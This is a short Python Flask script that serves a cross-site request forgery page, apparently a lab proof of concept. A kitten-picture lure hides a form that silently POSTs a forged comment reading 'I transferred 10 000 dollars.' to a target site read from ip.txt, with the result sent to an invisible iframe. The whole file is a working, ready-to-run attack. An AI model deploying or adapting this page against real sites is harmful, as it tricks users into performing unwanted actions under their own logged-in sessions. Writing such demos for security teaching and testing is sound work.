from flask import Flask, render_template_string

app = Flask(__name__)

ip = open('ip.txt', 'r').read()

@app.route("/")
def attack():
    return render_template_string(f"""
    <html>
      <body>
        <iframe name="csrf_frame" style="display:none;"></iframe>
        <h1>Want to see more cute kittens? Click the image.</h1>
        <form action="https://{ip}/" method="POST" target="csrf_frame">
          <input type="hidden" name="form" value="comment">
          <input type="hidden" name="title" value="Transfer">
          <input type="hidden" name="cont" value="I transferred 10 000 dollars.">
          <input type="image" src="/static/cat.jpg">
        </form>
      </body>
    </html>
    """)

app.run('0.0.0.0', 5000, ssl_context='adhoc')
